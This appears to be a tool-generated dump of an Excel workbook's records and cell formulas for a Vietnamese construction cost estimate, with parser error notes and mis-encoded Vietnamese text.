' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' 00fd     10 LABELSST : Cell Value, String Constant/ SST
' Sheet,Reference,Formula,Value
'  Tong hop kinh ph,A2,"CONCATENATE("C«ng tr×nh : ", Du toa!G12)",""
'  Tong hop kinh ph,A3,"CONCATENATE("H¹ng môc : ", Du toa!G13)",""
'  Tong hop kinh ph,D7, StartU!L74+ StartU!M74,""
'  Tong hop kinh ph,D8, Chenh lech vat t!I22,""
'  Tong hop kinh ph,D9, StartU!N74,""
'  Tong hop kinh ph,D10, StartU!O74,""
'  Tong hop kinh ph,A12,"",1.00000000000000000000
'  Tong hop kinh ph,C12,"CONCATENATE("(A + CLVL) * ", Tu van Thiet k!D1)",""
'  Tong hop kinh ph,D12,(D7+D8)* Du tha!B1,""
'  Tong hop kinh ph,A13,"",2.00000000000000000000
'  Tong hop kinh ph,C13,"CONCATENATE("B * ", Du tha!D2)",""
'  Tong hop kinh ph,D13,D9* Du tha!B2,""
'  Tong hop kinh ph,A14,"",3.00000000000000000000
'  Tong hop kinh ph,C14,"CONCATENATE("C * ", Du tha!D3)",""
'  Tong hop kinh ph,D14,D10* Du tha!B3,""
'  Tong hop kinh ph,A15,"",4.00000000000000000000
'  Tong hop kinh ph,D15,1.50000000000000000000,""
'  Tong hop kinh ph,D16,R~11C~3,""
'  Tong hop kinh ph,C17,"CONCATENATE("T * ", Du tha!D4,"%")",""
'  Tong hop kinh ph,D17,"['D16', '\x00Du tha!B4']",""
'  Tong hop kinh ph,D18,D16+D17,""
'  Tong hop kinh ph,C19,"CONCATENATE("(T+C) * ", Du tha!D5,"%")",""
'  Tong hop kinh ph,D19,"['(D16+D17)', '\x00Tu van Thiet k!B5']",""
'  Tong hop kinh ph,D20,D16+D17+D19,""
'  Tong hop kinh ph,C21,"CONCATENATE("G * ", Du tha!B6,"%")",""
'  Tong hop kinh ph,D21,"['D20', '\x00Du tha!B6']",""
'  Tong hop kinh ph,D22,D20+D21,""
'  Tong hop kinh ph,C23,"CONCATENATE("G * ", Du tha!B7,"% * (1+", Du tha!B6,"%)")",""
'  Tong hop kinh ph,D23,"['D20*1', '\x00Du tha!B7']",""
'  Tong hop kinh ph,D24,D22+D23,""
'  Tong hop kinh ph,D25,"['D24', 'ROUND(-3.00000000000000000000)']",""
'  Tong hop kinh ph,A28,"['D25', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Du toa,A2,"CONCATENATE("C«ng tr×nh : ", Du toa!G12)",""
'  Du toa,A3,"CONCATENATE("H¹ng môc : ", Du toa!G13)",""
'  Du toa,A8,"",1.00000000000000000000
'  Du toa,G8,"['R~8C~4', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Du toa,L8,G8*H8,""
'  Du toa,M8,G8*I8,""
'  Du toa,N8,G8*J8,""
'  Du toa,O8,G8*K8,""
'  Du toa,A10,"",2.00000000000000000000
'  Du toa,G10,"['R~10C~4', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Du toa,L10,G10*H10,""
'  Du toa,M10,G10*I10,""
'  Du toa,N10,G10*J10,""
'  Du toa,O10,G10*K10,""
'  Du toa,A13,"",3.00000000000000000000
'  Du toa,G13,"['R~13C~4', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Du toa,L13,G13*H13,""
'  Du toa,M13,G13*I13,""
'  Du toa,N13,G13*J13,""
'  Du toa,O13,G13*K13,""
'  Du toa,A15,"",4.00000000000000000000
'  Du toa,G15,"['R~15C~4', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Du toa,L15,G15*H15,""
'  Du toa,M15,G15*I15,""
'  Du toa,N15,G15*J15,""
'  Du toa,O15,G15*K15,""
'  Du toa,A17,"",5.00000000000000000000
'  Du toa,G17,G15,""
'  Du toa,L17,G17*H17,""
'  Du toa,M17,G17*I17,""
'  Du toa,N17,G17*J17,""
'  Du toa,O17,G17*K17,""
'  Du toa,A18,"",6.00000000000000000000
'  Du toa,L18,G18*H18,""
'  Du toa,M18,G18*I18,""
'  Du toa,N18,G18*J18,""
'  Du toa,O18,G18*K18,""
'  Du toa,A21,"",7.00000000000000000000
'  Du toa,G21,"['R~21C~4', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Du toa,L21,G21*H21,""
'  Du toa,M21,G21*I21,""
'  Du toa,N21,G21*J21,""
'  Du toa,O21,G21*K21,""
'  Du toa,A24,"",8.00000000000000000000
'  Du toa,G24,"['R~24C~4', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Du toa,L24,G24*H24,""
'  Du toa,M24,G24*I24,""
'  Du toa,N24,G24*J24,""
'  Du toa,O24,G24*K24,""
'  Du toa,A26,"",9.00000000000000000000
'  Du toa,G26,"['R~26C~4', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Du toa,L26,G26*H26,""
'  Du toa,M26,G26*I26,""
'  Du toa,N26,G26*J26,""
'  Du toa,O26,G26*K26,""
'  Du toa,A29,"",10.00000000000000000000
'  Du toa,G29,"['R~29C~4', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Du toa,L29,G29*H29,""
'  Du toa,M29,G29*I29,""
'  Du toa,N29,G29*J29,""
'  Du toa,O29,G29*K29,""
'  Du toa,A32,"",11.00000000000000000000
'  Du toa,G32,"['R~32C~4', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Du toa,L32,G32*H32,""
'  Du toa,M32,G32*I32,""
'  Du toa,N32,G32*J32,""
'  Du toa,O32,G32*K32,""
'  Du toa,A37,"",12.00000000000000000000
'  Du toa,G37,"['R~37C~4', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Du toa,L37,G37*H37,""
'  Du toa,M37,G37*I37,""
'  Du toa,N37,G37*J37,""
'  Du toa,O37,G37*K37,""
'  Du toa,A40,"",13.00000000000000000000
'  Du toa,G40,"['R~40C~4', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Du toa,H40,335000.00000000000000000000*2,""
'  Du toa,L40,G40*H40,""
'  Du toa,M40,G40*I40,""
'  Du toa,N40,G40*J40,""
'  Du toa,O40,G40*K40,""
'  Du toa,A43,"",14.00000000000000000000
'  Du toa,G43,"['R~43C~4', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Du toa,L43,G43*H43,""
'  Du toa,M43,G43*I43,""
'  Du toa,N43,G43*J43,""
'  Du toa,O43,G43*K43,""
'  Du toa,A46,"",15.00000000000000000000
'  Du toa,G46,"['R~46C~4', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Du toa,L46,G46*H46,""
'  Du toa,M46,G46*I46,""
'  Du toa,N46,G46*J46,""
'  Du toa,O46,G46*K46,""
'  Du toa,A49,"",16.00000000000000000000
'  Du toa,G49,"['R~49C~4', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Du toa,L49,G49*H49,""
'  Du toa,M49,G49*I49,""
'  Du toa,N49,G49*J49,""
'  Du toa,O49,G49*K49,""
'  Du toa,A52,"",17.00000000000000000000
'  Du toa,G52,"['R~52C~4', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Du toa,L52,G52*H52,""
'  Du toa,M52,G52*I52,""
'  Du toa,N52,G52*J52,""
'  Du toa,O52,G52*K52,""
'  Du toa,A55,"",18.00000000000000000000
'  Du toa,G55,"['R~55C~4', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Du toa,H55,"",50000.00000000000000000000
'  Du toa,L55,G55*H55,""
'  Du toa,A58,"",19.00000000000000000000
'  Du toa,G58,"['R~58C~4', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Du toa,L58,G58*H58,""
'  Du toa,M58,G58*I58,""
'  Du toa,N58,G58*J58,""
'  Du toa,O58,G58*K58,""
'  Du toa,A61,"",20.00000000000000000000
'  Du toa,G61,"['R~61C~4', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Du toa,H61,58400*100,""
'  Du toa,L61,G61*H61,""
'  Du toa,M61,G61*I61,""
'  Du toa,N61,G61*J61,""
'  Du toa,O61,G61*K61,""
'  Du toa,A63,"",21.00000000000000000000
'  Du toa,G63,"['R~63C~4', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Du toa,H63,17500*100,""
'  Du toa,L63,G63*H63,""
'  Du toa,M63,G63*I63,""
'  Du toa,N63,G63*J63,""
'  Du toa,O63,G63*K63,""
'  Du toa,A65,"",22.00000000000000000000
'  Du toa,G65,"['R~65C~4', '*STACKERROR* not enough arguments for function: User Defined Function']",""
'  Du toa,H65,5000*100,""
'  Du toa,L65,G65*H65,""
'  Du toa,M65,G65*I65,""
'  Du toa,N65,G65*J65,""
'  Du toa,O65,G65*K65,""
'  Du toa,A67,"",23.00000000000000000000
'  Du toa,L67,G67*H67,""
'  Du toa,M67,G67*I67,""
'  Du toa,N67,G67*J67,""
'  Du toa,O67,G67*K67,""
'  Du toa,A68,"",24.00000000000000000000
'  Du toa,L68,G68*H68,""
'  Du toa,M68,G68*I68,""
'  Du toa,N68,G68*J68,""
'  Du toa,O68,G68*K68,""
'  Du toa,A69,"",25.00000000000000000000
'  Du toa,L69,G69*H69,""
'  Du toa,M69,G69*I69,""
'  Du toa,N69,G69*J69,""
'  Du toa,O69,G69*K69,""
'  Du toa,A70,"",26.00000000000000000000
'  Du toa,L70,G70*H70,""
'  Du toa,M70,G70*I70,""
'  Du toa,N70,G70*J70,""
'  Du toa,O70,G70*K70,""
'  Du toa,A71,"",27.00000000000000000000
'  Du toa,L71,G71*H71,""
'  Du toa,M71,G71*I71,""
'  Du toa,N71,G71*J71,""
'  Du toa,O71,G71*K71,""
'  Du toa,L74,R~6C~11,""
'  Du toa,M74,R~6C~12,""
'  Du toa,N74,R~6C~13,""
'  Du toa,O74,R~6C~14,""
'  Chenh lech vat t,A2,"CONCATENATE("C«ng tr×nh : ", Du toa!G12)",""
'  Chenh lech vat t,A3,"CONCATENATE("H¹ng môc : ", Du toa!G13)",""
'  Chenh lech vat t,A8,"",1.00000000000000000000
'  Chenh lech vat t,E8, Gia VL den H!E7,""
'  Chenh lech vat t,H8,[],""
'  Chenh lech vat t,I8,[],""
'  Chenh lech vat t,J8, Gia VL den H!F7,""
'  Chenh lech vat t,K8,[],""
'  Chenh lech vat t,L8,[],""
'  Chenh lech vat t,M8,[],""
'  Chenh lech vat t,N8,[],""
'  Chenh lech vat t,A9,"",2.00000000000000000000
'  Chenh lech vat t,E9, Gia VL den H!E8,""
'  Chenh lech vat t,H9,[],""
'  Chenh lech vat t,I9,[],""
'  Chenh lech vat t,J9, Gia VL den H!F8,""
'  Chenh lech vat t,K9,[],""
'  Chenh lech vat t,L9,[],""
'  Chenh lech vat t,M9,[],""
'  Chenh lech vat t,N9,[],""
'  Chenh lech vat t,A10,"",3.00000000000000000000
'  Chenh lech vat t,E10, Gia VL den H!E9,""
'  Chenh lech vat t,H10,[],""
'  Chenh lech vat t,I10,[],""
'  Chenh lech vat t,J10, Gia VL den H!F9,""
'  Chenh lech vat t,K10,[],""
'  Chenh lech vat t,L10,[],""
'  Chenh lech vat t,M10,[],""
'  Chenh lech vat t,N10,[],""
'  Chenh lech vat t,A11,"",4.00000000000000000000
'  Chenh lech vat t,E11, Gia VL den H!E10,""
'  Chenh lech vat t,H11,[],""
'  Chenh lech vat t,I11,[],""
'  Chenh lech vat t,J11, Gia VL den H!F10,""
'  Chenh lech vat t,K11,[],""
'  Chenh lech vat t,L11,[],""
'  Chenh lech vat t,M11,[],""
'  Chenh lech vat t,N11,[],""
'  Chenh lech vat t,A12,"",5.00000000000000000000
'  Chenh lech vat t,E12, Gia VL den H!E11,""
'  Chenh lech vat t,H12,[],""
'  Chenh lech vat t,I12,[],""
'  Chenh lech vat t,J12, Gia VL den H!F11,""
'  Chenh lech vat t,K12,[],""
'  Chenh lech vat t,L12,[],""
'  Chenh lech vat t,M12,[],""
'  Chenh lech vat t,N12,[],""
'  Chenh lech vat t,A13,"",6.00000000000000000000
'  Chenh lech vat t,E13, Gia VL den H!E12,""
'  Chenh lech vat t,H13,[],""
'  Chenh lech vat t,I13,[],""
'  Chenh lech vat t,J13, Gia VL den H!F12,""
'  Chenh lech vat t,K13,[],""
'  Chenh lech vat t,L13,[],""
'  Chenh lech vat t,M13,[],""
'  Chenh lech vat t,N13,[],""
'  Chenh lech vat t,A14,"",7.00000000000000000000
'  Chenh lech vat t,E14, Gia VL den H!E13,""
'  Chenh lech vat t,H14,[],""
'  Chenh lech vat t,I14,[],""
'  Chenh lech vat t,J14, Gia VL den H!F13,""
'  Chenh lech vat t,K14,[],""
'  Chenh lech vat t,L14,[],""
'  Chenh lech vat t,M14,[],""
'  Chenh lech vat t,N14,[],""
'  Chenh lech vat t,A15,"",8.00000000000000000000
'  Chenh lech vat t,E15, Gia VL den H!E14,""
'  Chenh lech vat t,H15,[],""
'  Chenh lech vat t,I15,[],""
'  Chenh lech vat t,J15, Gia VL den H!F14,""
'  Chenh lech vat t,K15,[],""
'  Chenh lech vat t,L15,[],""
'  Chenh lech vat t,M15,[],""
'  Chenh lech vat t,N15,[],""
'  Chenh lech vat t,A16,"",9.00000000000000000000
'  Chenh lech vat t,I16,N22,""
'  Chenh lech vat t,A18,"",10.00000000000000000000
'  Chenh lech vat t,E18, Gia VL den H!E16,""
'  Chenh lech vat t,H18,G18-F18,""
'  Chenh lech vat t,I18,E18*H18,""
'  Chenh lech vat t,J18, Gia VL den H!F16,""
'  Chenh lech vat t,K18,F18,""
'  Chenh lech vat t,L18,G18,""
'  Chenh lech vat t,M18,L18-K18,""
'  Chenh lech vat t,N18,J18*M18,""
'  Chenh lech vat t,A19,"",11.00000000000000000000
'  Chenh lech vat t,E19, Gia VL den H!E17,""
'  Chenh lech vat t,H19,G19-F19,""
'  Chenh lech vat t,I19,E19*H19,""
'  Chenh lech vat t,J19, Gia VL den H!F17,""
'  Chenh lech vat t,K19,F19,""
'  Chenh lech vat t,L19,G19,""
'  Chenh lech vat t,M19,L19-K19,""
'  Chenh lech vat t,N19,J19*M19,""
'  Chenh lech vat t,A21,"",12.00000000000000000000
'  Chenh lech vat t,E21, Gia VL den H!E19,""
'  Chenh lech vat t,H21,G21-F21,""
